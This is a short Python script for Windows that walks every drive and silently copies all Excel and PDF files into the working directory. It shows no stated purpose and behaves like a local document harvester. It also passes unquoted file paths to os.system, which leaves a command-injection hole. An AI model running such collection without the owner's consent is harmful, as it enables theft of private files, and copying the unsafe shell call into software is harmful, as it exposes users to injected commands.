import win32api
import os
from os.path import isfile, join, isdir

drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]
cur_dir = os.path.abspath(os.getcwd())

def process_dir(dir):
    for element in os.listdir(dir):
        joined = join(dir, element)
        if isfile(joined):
            if element.endswith('.xlsx') or element.endswith('.pdf') or element.endswith('.xls'):
                print(joined)
                command = 'copy ' + joined + ' ' + cur_dir + '\\'
                os.system(command)
        elif isdir(joined):
            try:
                process_dir(joined)
            except Exception:
                pass


for drive in enumerate(drives):
    try:
        process_dir(drive[1])
    except Exception:
        pass
